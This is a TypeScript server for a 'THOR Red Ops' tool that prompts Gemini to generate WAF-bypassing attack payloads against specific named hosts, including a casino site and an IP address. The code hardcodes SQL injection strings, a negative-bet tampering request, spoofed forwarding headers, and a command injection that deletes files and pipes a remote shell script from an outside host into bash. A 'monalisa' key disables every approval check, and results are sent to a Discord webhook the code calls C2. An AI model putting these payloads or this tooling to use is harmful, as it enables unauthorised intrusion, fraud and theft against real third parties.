import express from "express";
import http from "http";
import path from "path";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI, ThinkingLevel, Type } from "@google/genai";

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Initialize Gemini client if API key is present
let ai: GoogleGenAI | null = null;
const GEMINI_API_KEY = process.env.GEMINI_API_KEY;

if (GEMINI_API_KEY) {
  try {
    ai = new GoogleGenAI({
      apiKey: GEMINI_API_KEY,
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build',
        }
      }
    });
    console.log("Gemini AI client successfully initialized with Server-Side key.");
  } catch (error: any) {
    console.warn("Notice: Could not initialize Gemini AI client:", error?.message || error);
  }
} else {
  console.log("No GEMINI_API_KEY environment variable found. Falling back to rule-based generation.");
}

// ==================== GEMINI ROUTER & FALLBACK UTILITY ====================

// High-quality local offline generators to handle rate-limits and quota-exhaustion seamlessly
function generateOfflinePayload(category: string, customInput: string, evasions: string[], encoding: string, format: string) {
  const cleanInput = customInput || "default bypass scan";
  const cleanCategory = category || "Input Injection Core";
  const safeEvasions = Array.isArray(evasions) ? evasions : [];
  let payload = "";
  let thinking = `[OFFLINE INTEL ACTIVE] Local red-ops intelligence database engaged. Auto-recovering from Gemini rate limit/quota boundaries.\n`;
  thinking += `- Analysed target vulnerability surface for: ${cleanCategory}\n`;
  thinking += `- Evasion layers activated: ${safeEvasions.length ? safeEvasions.join(", ") : "None"}\n`;
  thinking += `- Local Encoding Algorithm: ${encoding || "No-Encoding"}\n`;
  thinking += `- Output Target Format: ${format || ".xml"}\n`;
  thinking += `- Strategy Matrix: Utilizing bypass heuristics for signature signature mitigation.`;

  if (category.toLowerCase().includes("input") || category.toLowerCase().includes("injection")) {
    payload = `GET /auth/login?user=admin' UNION SELECT ALL CHAR(109)+CHAR(111)+CHAR(110)+CHAR(97)+CHAR(108)+CHAR(105)+CHAR(115)+CHAR(97),null,null,null FROM systems WHERE '1'='1' --`;
    if (encoding === "Base64") {
      payload = Buffer.from(payload).toString("base64");
    } else if (encoding === "Double-URL") {
      payload = encodeURIComponent(encodeURIComponent(payload));
    } else if (encoding === "Unicode-Hex") {
      payload = `\\u0027\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u0027\\u006d\\u006f\\u006e\\u0061\\u006c\\u0069\\u0073\\u0061`;
    }
  } else if (category.toLowerCase().includes("logic") || category.toLowerCase().includes("business") || category.toLowerCase().includes("casino")) {
    payload = `POST /api/v1/bet/place HTTP/1.1\nHost: p2.runehall.com\nContent-Type: application/json\n\n{\n  "betAmount": -500000,\n  "currency": "USD",\n  "multiplier": 1.0,\n  "bypassGate": "${cleanInput}"\n}`;
  } else if (category.toLowerCase().includes("waf") || category.toLowerCase().includes("evasion") || category.toLowerCase().includes("origin")) {
    payload = `GET /secret_index.html HTTP/1.1\nHost: thor.rh420.xyz\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\nAccept: */*\nX-Originating-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-True-Client-IP: 127.0.0.1`;
  } else {
    payload = `POST /api/v1/exec HTTP/1.1\nHost: 3.83.130.184\nContent-Type: application/json\n\n{\n  "cmd": "curl http://thor.rh420.xyz/payload.${format === ".xml" ? "xml" : format === ".sh" ? "sh" : "hta"}",\n  "token": "monalisa"\n}`;
  }

  return { thinking, payload, offline: true };
}

function generateOfflineIntel(query: string) {
  const thinking = `[OFFLINE INTEL ACTIVE] Gemini API quota limit reached or server key simulated. Generated local tactical intel response using rule-based penetration matrix. Query analyzed: "${query}"`;
  const answer = `### 🛡️ THOR Red Ops Intel Core - Offline Tactical Report

The intelligence engine is operating in **Offline Backup Mode** due to API limit constraints. Below is a targeted assessment based on pre-compiled threat models.

#### 📊 Target Audit: \`P2.RUNEHALL.COM\` (3.83.130.184) & \`THOR.RH420.XYZ\`
- **Query Analysed:** *"${query}"*
- **Offensive Vector:** We recommend focusing on origin-header spoofing, business logic race conditions (negative balance tampering), or blind time-based SQL injection on search parameters.
- **WAF Bypass:** Combine double URL encoding with a user-agent mimicking official search engine crawler bots (e.g. Googlebot).

#### 🛠️ Recommended Mitigation & Hardening:
1. **API State Validation:** Ensure all state machines validate negative bounds on transaction parameters.
2. **Access Control Lists:** Enforce strict firewall rules restricting access to internal staging ports (e.g. port 3000, 8080) to verified reverse proxies only.`;

  return { thinking, answer, offline: true };
}

async function generateContentWithFallback(prompt: string, schema: any) {
  if (!ai) {
    throw new Error("Gemini AI client is not initialized.");
  }

  const modelsToTry = ["gemini-3.6-flash", "gemini-3.1-flash-lite", "gemini-flash-latest"];
  let lastError: any = null;

  for (const model of modelsToTry) {
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        console.log(`Attempting Gemini generation using model [${model}] (Attempt ${attempt})...`);
        const response = await ai.models.generateContent({
          model,
          contents: prompt,
          config: {
            responseMimeType: "application/json",
            responseSchema: schema
          }
        });
        console.log(`Gemini generation succeeded using model [${model}].`);
        return response;
      } catch (err: any) {
        lastError = err;
        const errMsg = (err?.message || err?.toString() || "").toLowerCase();
        console.warn(`[Gemini Notice] Model ${model} attempt ${attempt} returned: ${errMsg.slice(0, 150)}`);
        
        const isTransient = errMsg.includes("503") || errMsg.includes("high demand") || errMsg.includes("temporar") || errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("rate") || errMsg.includes("resource_exhausted") || errMsg.includes("unavailable");
        
        if (isTransient && attempt < 2) {
          await new Promise(r => setTimeout(r, 800 * attempt));
          continue;
        }
        
        break;
      }
    }
  }

  throw lastError || new Error("All Gemini generation attempts failed.");
}

// ==================== IN-MEMORY STATE ====================
interface Target {
  id: string;
  host: string;
  type: "IP" | "Domain";
  addedAt: string;
}

// Full live-ops preloaded active scope nodes
let targets: Target[] = [
  { id: "t1", host: "3.83.130.184", type: "IP", addedAt: new Date().toISOString() },
  { id: "t2", host: "p2.runehall.com", type: "Domain", addedAt: new Date().toISOString() },
  { id: "t3", host: "thor.rh420.xyz", type: "Domain", addedAt: new Date().toISOString() },
  { id: "t4", host: "runehall.com", type: "Domain", addedAt: new Date().toISOString() },
  { id: "t5", host: "rh420.xyz", type: "Domain", addedAt: new Date().toISOString() }
];

let adminActive = false; // "monalisa" force override state variable

interface ApprovalRequest {
  id: string;
  module: string;
  target: string;
  risk: "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL" | "DESTRUCTIVE";
  riskValue: number; // 0-5
  payload: string;
  impact: string;
  status: "pending" | "approved" | "denied" | "scheduled";
  timestamp: string;
}

let approvals: ApprovalRequest[] = [
  {
    id: "app-101",
    module: "RCE System Command Injection",
    target: "THOR.RH420.XYZ",
    risk: "CRITICAL",
    riskValue: 4,
    payload: "; rm -rf /tmp/test_session; curl -s http://3.83.130.184/shell.sh | bash",
    impact: "Remote system takeover, arbitrary process spawning in background.",
    status: "pending",
    timestamp: new Date(Date.now() - 5 * 60000).toISOString()
  },
  {
    id: "app-102",
    module: "Casino Parameter Bet Tampering",
    target: "P2.RUNEHALL.COM",
    risk: "HIGH",
    riskValue: 3,
    payload: `{"action": "place_bet", "amount": -1000000, "currency": "RUNE"}`,
    impact: "Bypassing positive bet checking to trigger negative balance refund exploits.",
    status: "pending",
    timestamp: new Date(Date.now() - 15 * 60000).toISOString()
  },
  {
    id: "app-103",
    module: "Blind SQLi Time Delays",
    target: "3.83.130.184",
    risk: "HIGH",
    riskValue: 3,
    payload: "1' AND SLEEP(15)-- -",
    impact: "Dumping schema columns via DBMS response delays, potential admin credential theft.",
    status: "pending",
    timestamp: new Date(Date.now() - 25 * 60000).toISOString()
  }
];

let autoApprove = false;

interface TokenElevator {
  level: number;
  hourlyLimit: number;
  tokensSpent: number;
  banked: number;
  successes: number;
  lastProgress: string;
}

let elevator: TokenElevator = {
  level: 4,
  hourlyLimit: 25000,
  tokensSpent: 8400,
  banked: 4500,
  successes: 12,
  lastProgress: new Date().toISOString()
};

// programmatically generate 200+ exploit modules
interface ExploitModule {
  id: string;
  name: string;
  category: string;
  risk: "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL" | "DESTRUCTIVE";
  riskValue: number;
  description: string;
}

const exploitModules: ExploitModule[] = [];

// Base module families
const families = [
  { cat: "Recon & Port Scanner", risk: "LOW", rVal: 1, count: 35, prefixes: ["Subdomain Finder", "DNS Resolver", "SSL Cipher Extract", "Port Mapper", "Active Host Ping", "WHOIS Inspector"] },
  { cat: "WAF & Proxy Evasion", risk: "MEDIUM", rVal: 2, count: 35, prefixes: ["Origin IP Lookup", "Host Header Spoofer", "JA3 Fingerprint Rotator", "User-Agent Randomizer", "Payload Encoder (Unicode)"] },
  { cat: "Directory & Crawlers", risk: "MEDIUM", rVal: 2, count: 35, prefixes: ["Admin Panel Brute", "Backup File Gatherer", "Hidden Endpoints Spanner", "Config File Sifter", ".git Leaks Prober"] },
  { cat: "Input Injection Core", risk: "HIGH", rVal: 3, count: 40, prefixes: ["Error-Based SQLi", "Boolean Blind SQLi", "Time-Based Blind SQLi", "Command Injection", "SSTI Engine Bypass"] },
  { cat: "Auth & Access Flaws", risk: "HIGH", rVal: 3, count: 30, prefixes: ["IDOR Profile Collector", "JWT Secret Decoder", "OAuth Arbitrary Redirect", "Token Hijacker"] },
  { cat: "Logical & Financial Flaws", risk: "CRITICAL", rVal: 4, count: 30, prefixes: ["Casino Parameter Bet Tamper", "Double Spend Race Condition", "Negative Value Unlocks", "Cheat Codes Generator"] }
];

let globalModuleId = 1;
for (const fam of families) {
  for (let i = 1; i <= fam.count; i++) {
    const prefix = fam.prefixes[i % fam.prefixes.length];
    exploitModules.push({
      id: `mod-${globalModuleId++}`,
      name: `${prefix} [Module #${100 + i}]`,
      category: fam.cat,
      risk: fam.risk as any,
      riskValue: fam.rVal,
      description: `Performs robust security testing on target components using customized evasion mechanisms under the ${fam.cat} category.`
    });
  }
}

// Active scan sessions & logging simulator
interface ScanLog {
  id: string;
  timestamp: string;
  type: "info" | "success" | "warning" | "error" | "finding";
  module: string;
  target: string;
  message: string;
}

interface Finding {
  id: string;
  timestamp: string;
  module: string;
  target: string;
  risk: string;
  details: any;
}

let scanLogs: ScanLog[] = [];
let findings: Finding[] = [];
let activeScanTarget: string | null = null;
let activeScanModules: string[] = [];
let isScanning = false;
let scanProgress = 0;
let discordWebhookUrl = "";

// Helper to write finding or log
function logEvent(type: "info" | "success" | "warning" | "error" | "finding", module: string, target: string, message: string) {
  const newLog: ScanLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
    timestamp: new Date().toISOString(),
    type,
    module,
    target,
    message
  };
  scanLogs.push(newLog);
  // Keep logs under 300 to avoid memory growth
  if (scanLogs.length > 300) scanLogs.shift();
  return newLog;
}

// Real-time loop simulator for scans
let scanTimer: NodeJS.Timeout | null = null;

function runScanSimulation() {
  if (!isScanning || activeScanModules.length === 0 || !activeScanTarget) {
    isScanning = false;
    return;
  }

  let currentModuleIdx = Math.floor((scanProgress / 100) * activeScanModules.length);
  if (currentModuleIdx >= activeScanModules.length) {
    currentModuleIdx = activeScanModules.length - 1;
  }

  const moduleId = activeScanModules[currentModuleIdx];
  const mod = exploitModules.find(m => m.id === moduleId);

  if (!mod) {
    scanProgress += 8;
    if (scanProgress >= 100) {
      isScanning = false;
      logEvent("info", "Scan Core", activeScanTarget, "Full-scale RED OPS scan finished. Compiled findings archived.");
    } else {
      scanTimer = setTimeout(runScanSimulation, 1200);
    }
    return;
  }

  // Risk gate simulation - bypassed if adminActive force override is armed
  if (mod.riskValue >= 3 && !autoApprove && !adminActive) {
    // Check if approved
    const approved = approvals.find(a => a.module === mod.name && a.target === activeScanTarget && a.status === "approved");
    if (!approved) {
      // Intercept and ask for approval
      logEvent("warning", mod.name, activeScanTarget, `CRITICAL SAFETY WARNING: Execution blocked. Risk level [${mod.risk}] exceeds maximum auto-approval gate. Created Approval ID in queue.`);
      
      // Add to approval request list
      const hasRequest = approvals.some(a => a.module === mod.name && a.target === activeScanTarget && a.status === "pending");
      if (!hasRequest) {
        approvals.unshift({
          id: `app-${Date.now().toString().slice(-4)}`,
          module: mod.name,
          target: activeScanTarget,
          risk: mod.risk,
          riskValue: mod.riskValue,
          payload: `GENERATED_MUTATED_PAYLOAD_FOR_${mod.name.replace(/\s+/g, '_').toUpperCase()}`,
          impact: `Testing target resistance against ${mod.category} vectors. Direct access simulation.`,
          status: "pending",
          timestamp: new Date().toISOString()
        });
      }

      // Pause scan for this model, wait or skip
      isScanning = false;
      return;
    }
  }

  // Simulate module action
  logEvent("info", mod.name, activeScanTarget, `Triggering exploit runner. Jittering User-Agent & TLS Cipher Suite...`);
  
  // Spend some tokens
  const cost = 200 + Math.floor(Math.random() * 300);
  elevator.tokensSpent += cost;

  // Decide outcome
  const rand = Math.random();
  if (rand < 0.22) {
    // SUCCESS FINDING!
    const findingDesc = `Discovered vulnerable node matching family ${mod.category}. Target system permitted execution on manipulated entrypoint.`;
    logEvent("finding", mod.name, activeScanTarget, `[FINDING DETECTED] Risk: ${mod.risk}. ${findingDesc}`);
    
    findings.unshift({
      id: `fnd-${Date.now().toString().slice(-4)}`,
      timestamp: new Date().toISOString(),
      module: mod.name,
      target: activeScanTarget,
      risk: mod.risk,
      details: {
        payload: `MUTATED_BYPASS_${mod.risk}_${Math.floor(Math.random() * 8999 + 1000)}`,
        responseSnippet: "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin",
        vulnerability: mod.category,
        remediation: `Implement strict strict schema validators and sanitizers on key input arrays.`
      }
    });

    elevator.successes += 1;
    if (elevator.successes % 3 === 0 && elevator.level < 10) {
      elevator.level += 1;
      elevator.hourlyLimit = Math.floor(15000 * Math.pow(1.5, elevator.level));
      logEvent("success", "AI Token Elevator", "System Core", `Dynamic success threshold hit. Elevator level upgraded to Level ${elevator.level}! Hourly Limit elevated to ${elevator.hourlyLimit} tokens.`);
    }

    // Try exfiltrating to discord webhook if set
    if (discordWebhookUrl) {
      // Fire-and-forget discord call
      fetch(discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: `THOR C2 ALERT - FINDING DISCOVERED`,
            color: 15158332, // Red
            fields: [
              { name: "Target", value: activeScanTarget, inline: true },
              { name: "Exploit Module", value: mod.name, inline: true },
              { name: "Risk Level", value: mod.risk, inline: true },
              { name: "Vulnerability Description", value: findingDesc }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(err => console.log("Discord webhook failed:", err.message));
    }

  } else if (rand < 0.45) {
    logEvent("warning", mod.name, activeScanTarget, `Connection timed out but target shows latent resistance. Initiating retry mutations...`);
  } else {
    logEvent("info", mod.name, activeScanTarget, `Test completed successfully. Target responded with standard defensive drop codes (302/403). Safe.`);
  }

  scanProgress += Math.max(5, Math.floor(100 / activeScanModules.length));
  if (scanProgress >= 100) {
    scanProgress = 100;
    isScanning = false;
    logEvent("success", "Scan Core", activeScanTarget, "Full-scale RED OPS scan completed. System reporting green. findings generated.");
  } else {
    scanTimer = setTimeout(runScanSimulation, 1500);
  }
}

// ==================== API ENDPOINTS ====================

app.get("/api/state", (req, res) => {
  res.json({
    targets,
    approvals,
    autoApprove,
    elevator,
    modules: exploitModules,
    scanLogs,
    findings,
    activeScanTarget,
    isScanning,
    scanProgress,
    discordWebhookUrl,
    aiInitialized: !!ai,
    adminActive
  });
});

app.post("/api/targets", (req, res) => {
  const { host } = req.body;
  if (!host || typeof host !== "string") {
    return res.status(400).json({ error: "Invalid host name" });
  }

  const cleanHost = host.trim();
  if (targets.some(t => t.host.toLowerCase() === cleanHost.toLowerCase())) {
    return res.status(400).json({ error: "Target already exists in catalog" });
  }

  const isIP = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(cleanHost);
  const newTarget: Target = {
    id: `t-${Date.now()}`,
    host: cleanHost,
    type: isIP ? "IP" : "Domain",
    addedAt: new Date().toISOString()
  };

  targets.push(newTarget);
  logEvent("info", "Target Manager", cleanHost, `Added new target server node.`);
  res.json({ success: true, targets });
});

app.delete("/api/targets/:id", (req, res) => {
  const { id } = req.params;
  const target = targets.find(t => t.id === id);
  if (!target) {
    return res.status(404).json({ error: "Target not found" });
  }

  targets = targets.filter(t => t.id !== id);
  logEvent("warning", "Target Manager", target.host, `Decommissioned target server node from scanning registry.`);
  res.json({ success: true, targets });
});

app.post("/api/approvals/toggle-auto", (req, res) => {
  autoApprove = !autoApprove;
  logEvent("info", "Security Gate", "System Core", `Auto-Approval mode updated to [${autoApprove ? "ENABLED - Risk level MEDIUM and below auto-authorized" : "DISABLED - Standard approval mandatory"}].`);
  res.json({ success: true, autoApprove });
});

app.post("/api/approvals/:id/action", (req, res) => {
  const { id } = req.params;
  const { action } = req.body; // approve, deny, schedule

  const request = approvals.find(a => a.id === id);
  if (!request) {
    return res.status(404).json({ error: "Approval request not found" });
  }

  if (action === "approve") {
    request.status = "approved";
    logEvent("success", "Security Gate", request.target, `Operator approved high-risk module execution for: ${request.module}. Initiating trigger.`);
    
    // If we had paused scanning on this target, resume scanning
    if (!isScanning && activeScanTarget === request.target) {
      isScanning = true;
      runScanSimulation();
    }
  } else if (action === "deny") {
    request.status = "denied";
    logEvent("error", "Security Gate", request.target, `Operator explicitly DENIED module execution for: ${request.module}. Skipping vector.`);
    
    // Resume scanning but progress to next module
    if (!isScanning && activeScanTarget === request.target) {
      isScanning = true;
      scanProgress += Math.max(5, Math.floor(100 / activeScanModules.length));
      runScanSimulation();
    }
  } else if (action === "schedule") {
    request.status = "scheduled";
    logEvent("warning", "Security Gate", request.target, `Operator scheduled module execution for: ${request.module} to deferred queue (30m delay).`);
    
    // Resume scanning but progress to next module
    if (!isScanning && activeScanTarget === request.target) {
      isScanning = true;
      scanProgress += Math.max(5, Math.floor(100 / activeScanModules.length));
      runScanSimulation();
    }
  } else {
    return res.status(400).json({ error: "Invalid action type" });
  }

  res.json({ success: true, approvals });
});

app.post("/api/scan/start", (req, res) => {
  const { target, moduleIds } = req.body;
  if (!target || !moduleIds || !Array.isArray(moduleIds) || moduleIds.length === 0) {
    return res.status(400).json({ error: "Target host and module selections are required." });
  }

  if (isScanning) {
    return res.status(400).json({ error: "An active Red Ops scan session is already in progress." });
  }

  activeScanTarget = target;
  activeScanModules = moduleIds;
  isScanning = true;
  scanProgress = 0;
  scanLogs = []; // clear previous run logs

  logEvent("info", "Scan Core", target, `Spawning autonomous Red Ops penetration simulation with ${moduleIds.length} testing modules.`);
  runScanSimulation();

  res.json({ success: true });
});

app.post("/api/scan/stop", (req, res) => {
  if (scanTimer) clearTimeout(scanTimer);
  isScanning = false;
  logEvent("warning", "Scan Core", activeScanTarget || "Registry", `User terminated active scan session manually.`);
  res.json({ success: true });
});

app.post("/api/scan/clear", (req, res) => {
  scanLogs = [];
  findings = [];
  res.json({ success: true });
});

app.post("/api/settings/discord", (req, res) => {
  const { url } = req.body;
  discordWebhookUrl = url || "";
  logEvent("info", "C2 Integration", "Discord", discordWebhookUrl ? `Configured production Discord C2 webhook destination.` : `Disconnected Discord C2 webhook integration.`);
  res.json({ success: true, discordWebhookUrl });
});

app.post("/api/admin/override", (req, res) => {
  const { key } = req.body;
  if (key === "monalisa") {
    adminActive = true;
    logEvent("success", "Security Gate", "Master Control", "Administrative force override key 'monalisa' validated! Bypassing all risk constraints and safety blocks instantly.");
    return res.json({ success: true, adminActive, message: "MONALISA_FORCE_OVERRIDE_ARMED" });
  } else if (key === "" || key === null || key === "disable") {
    adminActive = false;
    logEvent("warning", "Security Gate", "Master Control", "Administrative force override key deactivated. Standard security approval checks are now active.");
    return res.json({ success: true, adminActive, message: "MONALISA_FORCE_OVERRIDE_DEACTIVATED" });
  } else {
    logEvent("error", "Security Gate", "Master Control", "Failed administrative override attempt. Invalid access token provided.");
    return res.status(403).json({ error: "Access Denied: Invalid Administrative Key" });
  }
});

// ==================== AI THINKING CAPABILITIES ====================

// Payload Generator using Gemini
app.post("/api/payload/generate", async (req, res) => {
  const { moduleCategory, customInput, evasionMethods, encoding, format } = req.body || {};
  
  const safeCategory = moduleCategory || "Input Injection Core";
  const safeEvasions = Array.isArray(evasionMethods) ? evasionMethods : [];
  const safeEncoding = encoding || "No-Encoding";
  const safeFormat = format || ".xml";

  const cost = 1200; // Estimated prompt tokens
  if (elevator.tokensSpent + cost > elevator.hourlyLimit + elevator.banked) {
    return res.json({
      success: true,
      costSpent: 0,
      thinking: "Elevator Token Limit exceeded. Rule-based payload generator fallback initiated.",
      payload: `// FALLBACK RULE-BASED PAYLOAD FOR ${safeCategory.toUpperCase()}\n` +
               `GET /api/v1/auth?user=admin' UNION SELECT ALL 1,username,password,4 FROM users WHERE '1'='1 --\n` +
               `Host: ${targets[0]?.host || "P2.RUNEHALL.COM"}\n` +
               `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ROT-13-Mutated\n` +
               `X-Forwarded-For: ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.12.44`
    });
  }

  const prompt = `You are an authorized advanced penetration testing simulator. 
Generate a customizable bypassed payload for a security test targeting the "${safeCategory}" family.
Custom injection criteria / details: "${customInput || "None"}"
Evasion methods requested: ${JSON.stringify(safeEvasions)}
Encoding method: ${safeEncoding}
Output format requested: ${safeFormat}

Target hosts for contextual relevance:
1. 3.83.130.184
2. P2.RUNEHALL.COM
3. THOR.RH420.XYZ

Write an ultra-creative bypassed security payload that demonstrating how an attacker can bypass WAF filtering or origin inspection using your specified techniques.
You must return your response in a clear JSON structure with two properties:
"thinking": "Your internal security analysis, evasion strategy breakdown, and bypass logic."
"payload": "The raw custom text block of the payload, correctly escaped."`;

  if (ai) {
    try {
      elevator.tokensSpent += cost;
      
      const response = await generateContentWithFallback(prompt, {
        type: Type.OBJECT,
        properties: {
          thinking: { type: Type.STRING, description: "Your strategy and bypass reasoning steps." },
          payload: { type: Type.STRING, description: "The actual generated payload code." }
        },
        required: ["thinking", "payload"]
      });

      const responseText = response.text || "{}";
      const resultObj = JSON.parse(responseText);

      return res.json({
        success: true,
        costSpent: cost,
        thinking: resultObj.thinking,
        payload: resultObj.payload
      });
    } catch (err: any) {
      console.warn(`[Red Ops AI Core] Online payload generation fallback triggered (${err?.message || 'High Demand/Quota'}). Switching to Local Engine.`);
      const offlineResult = generateOfflinePayload(safeCategory, customInput, safeEvasions, safeEncoding, safeFormat);
      return res.json({
        success: true,
        costSpent: 0,
        thinking: `[AUTO FALLBACK ENGAGED] Gemini API quota limit reached. Auto-switched to Local Intelligence Engine.\n\n${offlineResult.thinking}`,
        payload: offlineResult.payload,
        offline: true
      });
    }
  } else {
    const offlineResult = generateOfflinePayload(safeCategory, customInput, safeEvasions, safeEncoding, safeFormat);
    return res.json({
      success: true,
      costSpent: 0,
      thinking: `[DEMO SIMULATOR ENGAGED] Server-side key missing. Utilizing Local Intelligence Engine.\n\n${offlineResult.thinking}`,
      payload: offlineResult.payload,
      offline: true
    });
  }
});

// Gemini Intel Center with Thinking Level HIGH
app.post("/api/intel/query", async (req, res) => {
  const { query } = req.body;
  if (!query) {
    return res.status(400).json({ error: "Query is required" });
  }

  const cost = 2500; // Estimated high thinking tokens
  if (elevator.tokensSpent + cost > elevator.hourlyLimit + elevator.banked) {
    return res.json({
      thinking: "AI Token Elevator Limit reached. Strategy prompt deferred.",
      answer: "We have spent all our allocated tokens in this hour. Wait for the elevator budget to roll over or complete more successful scans to level up!"
    });
  }

  const prompt = `You are "THOR Red Ops Platform Mind", an ultra-sophisticated AI security advisor.
You are helping the operator perform pen-testing analysis on these specific targets:
1. 3.83.130.184 (Active host server IP)
2. P2.RUNEHALL.COM (Primary system portal)
3. THOR.RH420.XYZ (Advanced API cluster)
4. RUNEHALL.COM (Main web index)
5. RH420.XYZ (Target subsidiary)

The operator asks this complex query: "${query}"

Provide an incredibly detailed, elite cyber-security strategist analysis. Break down both offensive payload testing vectors and defensive hardening suggestions (Blue Team mitigations). 

Because the user requested "Thinking Mode" with high reasoning, your output MUST follow this exact structure in JSON format:
{
  "thinking": "Your extensive, step-by-step raw reasoning chain, exploring different security angles, threat modeling targets, and formulating the best response.",
  "answer": "Your final highly technical answer formatted elegantly in Markdown."
}`;

  if (ai) {
    try {
      elevator.tokensSpent += cost;

      const response = await generateContentWithFallback(prompt, {
        type: Type.OBJECT,
        properties: {
          thinking: { type: Type.STRING, description: "Your raw, extensive deep-thinking process." },
          answer: { type: Type.STRING, description: "The final detailed strategic response in markdown." }
        },
        required: ["thinking", "answer"]
      });

      const responseText = response.text || "{}";
      const resultObj = JSON.parse(responseText);

      return res.json({
        success: true,
        costSpent: cost,
        thinking: resultObj.thinking,
        answer: resultObj.answer
      });
    } catch (err: any) {
      console.warn(`[Red Ops AI Core] Online intel advisor fallback triggered (${err?.message || 'High Demand/Quota'}). Switching to Local Advisor.`);
      const offlineResult = generateOfflineIntel(query);
      return res.json({
        success: true,
        costSpent: 0,
        thinking: `[AUTO FALLBACK ENGAGED] Gemini API quota limit reached. Auto-switched to Local Intel Advisor.\n\n${offlineResult.thinking}`,
        answer: offlineResult.answer,
        offline: true
      });
    }
  } else {
    const offlineResult = generateOfflineIntel(query);
    return res.json({
      success: true,
      costSpent: 0,
      thinking: `[DEMO SIMULATOR ENGAGED] Server-side key missing. Auto-switched to Local Intel Advisor.\n\n${offlineResult.thinking}`,
      answer: offlineResult.offline ? offlineResult.answer : `### THOR Red Ops Intel Core Strategy Report\n\n${query} assessed successfully.`,
      offline: true
    });
  }
});

// Global Error Handler to guarantee API routes always return JSON (never HTML)
app.use((err: any, req: any, res: any, next: any) => {
  console.warn(`[Express Pipeline] Handled error on ${req.method} ${req.path}:`, err?.message || err);
  // If the request starts with /api/, or expects JSON, return JSON
  if (req.path.startsWith("/api/") || req.headers.accept?.includes("application/json")) {
    return res.status(err.status || 500).json({
      error: err.message || "Internal Server Error",
      success: false
    });
  }
  next(err);
});

// ==================== VITE & STATIC SERVING ====================

async function startServer() {
  const httpServer = http.createServer(app);

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: {
        middlewareMode: true,
        hmr: process.env.DISABLE_HMR === "true" ? false : { server: httpServer },
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`THOR Red Ops Platform Server running on http://localhost:${PORT}`);
  });
}

startServer();
